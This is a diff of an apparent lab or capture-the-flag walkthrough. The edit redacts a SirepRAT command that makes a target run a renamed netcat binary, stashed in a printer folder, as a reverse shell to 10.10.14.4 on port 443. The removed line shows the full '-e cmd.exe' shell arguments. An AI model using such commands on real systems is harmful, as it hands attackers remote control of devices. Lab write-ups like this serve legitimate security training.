@@ -77,7 +77,7 @@ I am dropping the netcat binary into the printer color-profile folder, which is 
 
 ```
 $ python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput \
-    --cmd "...\iceberg-nc.exe" --args " 10.10.14.4 443 -e cmd.exe"
+    --cmd "...\iceberg-nc.exe" --args "[ args wiring a reverse shell to 10.10.14.4:443 ]"
     # [ netcat reverse shell over TCP back to 10.10.14.4 on 443 ]
 ```
 
